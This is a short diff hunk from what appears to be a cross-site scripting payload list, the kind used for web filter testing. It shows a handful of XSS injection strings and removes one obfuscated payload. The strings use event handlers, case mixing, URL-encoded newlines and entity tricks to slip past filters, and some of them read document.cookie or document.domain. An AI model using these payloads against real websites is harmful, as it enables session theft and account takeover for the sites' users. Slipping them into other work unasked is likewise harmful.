@@ -3,7 +3,6 @@ xyz';"/></textarea><Img Src=OnXSS OnError=prompt(document.cookie)>
 "><body/onload="{x:onerror=alert};x"
 10</option></select><img/src=xon=()onx+honerror=alert(1)>ss<svg/onload=prompt(document.domain)%20>
 <script type="text/javascript">javascript:alert(1);</script>
-1<%0A!--%0A><%0ASvg%0COn%0ALoad=(conf%0Airm)(1)--%0A>
 <svg/onload=alert&sol;**&sol;(3)>
 <svg/onload=alert/*1337*/(1)>
 "><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
